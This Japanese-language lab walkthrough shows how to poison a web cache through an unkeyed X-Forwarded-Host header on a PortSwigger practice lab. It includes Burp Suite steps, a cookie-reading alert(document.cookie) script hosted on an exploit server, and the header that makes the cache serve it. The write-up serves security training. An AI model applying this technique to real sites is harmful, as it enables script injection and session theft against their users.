# キーのないヘッダーによる Web キャッシュ ポイズニング

以下のハッキングラボを実施します  
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header  
このラボは、キーのないヘッダーからの入力を安全でない方法で処理するため、Web キャッシュ ポイズニング に対して脆弱です。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. GET / HTTP/2 　リクエストを send to repeater します
- 4. 任意に存在しないパラメータを渡して、2 回送信します

```
GET /a=1
```

1 回目の送信結果

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=r1Zyb1SCQ2QCQCPYMYcYKgCCvcBtC3cP; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length:
```

2 回目の送信結果

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 20
X-Cache: hit
Content-Length: 10983
```

- 5. 1 回目と 2 回目でヘッダーに異なる X-Forwarded-Host を付加して、同じパラメータを送信します。すると 2 回目のレスポンスで X-Cache: hit が得られます。

```
X-Forwarded-Host: example.com
```

- 6. エクスプロイトサーバに移動します
- 7. ファイル名を/exploit から、ページのソース上から確認できる/resources/js/tracking.js に変更します
- 8. ペイロードを以下のように入力します

```
alert(document.cookie)
```

- 8. 保存ボタンを押します
- 9. Repeater から GET / リクエストに次のヘッダーを付けて送信します

```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

- 10. 上記リクエストでキャッシュが作られているので生存期間である 30 秒以内にブラウザをリロードするとスクリプトが実行されます
